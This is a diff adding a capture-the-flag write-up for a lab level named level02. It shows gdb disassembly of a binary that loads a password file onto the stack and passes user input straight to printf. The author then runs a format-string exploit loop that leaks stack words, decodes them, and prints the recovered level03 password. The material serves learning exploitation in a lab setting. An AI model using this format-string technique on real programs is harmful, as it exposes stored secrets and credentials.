@@ -1,0 +1,42 @@
+gdb> disass main
+   0x0000000000400898 <+132>:	mov    edx,0x400bb0                 ; "r"
+   0x000000000040089d <+137>:	mov    eax,0x400bb2                 ; "/home/users/level03/.pass"
+   0x00000000004008a2 <+142>:	mov    rsi,rdx
+   0x00000000004008a5 <+145>:	mov    rdi,rax
+   0x00000000004008a8 <+148>:	call   0x400700 <fopen@plt>         ; fopen("/home/users/level03/.pass", "r")
+[...]
+   0x00000000004009c3 <+431>:	mov    rax,QWORD PTR [rip+0x20087e] ; 0x601248 <stdin@@GLIBC_2.2.5>
+   0x00000000004009ca <+438>:	mov    rdx,rax
+   0x00000000004009cd <+441>:	lea    rax,[rbp-0x70]               ; username
+   0x00000000004009d1 <+445>:	mov    esi,0x64
+   0x00000000004009d6 <+450>:	mov    rdi,rax
+   0x00000000004009d9 <+453>:	call   0x4006f0 <fgets@plt>         ; fgets(username, 0x64)
+[...]
+   0x0000000000400a96 <+642>:	lea    rax,[rbp-0x70]               ; username
+   0x0000000000400a9a <+646>:	mov    rdi,rax
+   0x0000000000400a9d <+649>:	mov    eax,0x0
+   0x0000000000400aa2 <+654>:	call   0x4006c0 <printf@plt>        ; printf(username)
+[...]
+# Here we can see the password file is stored on the stack
+# We also see a call to `printf` with whatever we prevously entered
+# We can try to dump the stack with a Format String Attack to see if we can print the password
+
+$> for i in {0..32}; do python -c "print '%$i\$lx'" | ./level02 | grep 'access!'; done
+[...]
+756e505234376848 does not have access!
+45414a3561733951 does not have access!
+377a7143574e6758 does not have access!
+354a35686e475873 does not have access!
+48336750664b394d does not have access!
+[...]
+# We manage to print 5 addresses which actually look like strings
+# Now let's analyse them
+
+$> python -c "print '756e505234376848'.decode('hex')[::-1] + \
+                    '45414a3561733951'.decode('hex')[::-1] + \
+                    '377a7143574e6758'.decode('hex')[::-1] + \
+                    '354a35686e475873'.decode('hex')[::-1] + \
+                    '48336750664b394d'.decode('hex')[::-1]"
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+
+# Thats the password !
